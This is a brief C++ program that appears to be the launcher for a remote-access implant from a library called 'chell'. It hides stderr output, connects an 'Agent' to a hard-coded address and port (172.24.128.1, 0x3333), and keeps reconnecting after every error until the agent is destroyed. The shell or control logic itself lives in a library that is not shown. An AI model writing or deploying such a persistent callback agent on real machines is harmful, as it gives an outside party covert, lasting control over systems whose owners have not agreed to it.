#include <iostream>
#include <chell/common/agent.hpp>
#include <stdio.h>
#include <chell/common/stdio.hpp>

int main()
{
    FILE* stream = freopen("NUL", "w", stderr);
    std::unique_ptr<chell::Agent> agent = std::make_unique<chell::Agent>();
    while (true) {
        try {
            agent->run("172.24.128.1", 0x3333);
        }
        catch (const std::runtime_error& e) {
            printf("Restarting: %s\n", e.what());
        }
        if (agent->wasDestroyed) {
            break;
        }
        agent = std::make_unique<chell::Agent>();
    }
}
